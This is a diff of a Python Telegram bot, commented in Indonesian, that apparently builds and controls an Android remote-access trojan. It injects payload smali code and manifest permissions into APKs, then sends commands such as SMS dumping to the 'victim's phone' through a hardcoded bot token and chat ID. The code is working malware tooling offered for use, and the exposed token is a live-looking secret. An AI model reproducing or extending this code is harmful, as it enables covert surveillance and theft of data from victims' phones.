@@ -12,7 +12,8 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
 ALLOWED_CHAT_ID = 8598136412 
 
-WORK_DIR = "/data/data/com.termux/files/home/rat_builder"
+# PATH UDAH DISESUAIKAN KE FOLDER r4t
+WORK_DIR = "/data/data/com.termux/files/home/r4t" 
 KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
 KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
@@ -153,15 +154,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ── EKSEKUSI TOMBOL (NEMBAK KE CHAT) ──
     elif query.data.startswith("cmd_"):
-        # Ngambil nama perintah dari callback data (misal: cmd_dump_sms -> /dump_sms)
         perintah = "/" + query.data.replace("cmd_", "")
-        
-        # Bot nembak perintah ke chat kamu, biar ditangkep sama APK korban
-        await context.bot.send_message(
-            chat_id=ALLOWED_CHAT_ID, 
-            text=perintah
-        )
-        
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=perintah)
         await query.message.reply_text(f"⏳ Perintah `{perintah}` berhasil dikirim ke HP korban.\n*(Tunggu beberapa detik...)*", parse_mode='Markdown')
 
 # ── PROSES BUILD APK ──
@@ -184,7 +178,7 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
                 if smali_file.endswith(".smali"):
                     shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
         else:
-            raise Exception("Folder payload_smali tidak ditemukan! Jalanin compile.sh dulu.")
+            raise Exception(f"Folder {PAYLOAD_SMALI_DIR} tidak ditemukan! Pastikan udah diekstrak.")
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/5] Menyuntikkan Izin ke Manifest...")
         inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")
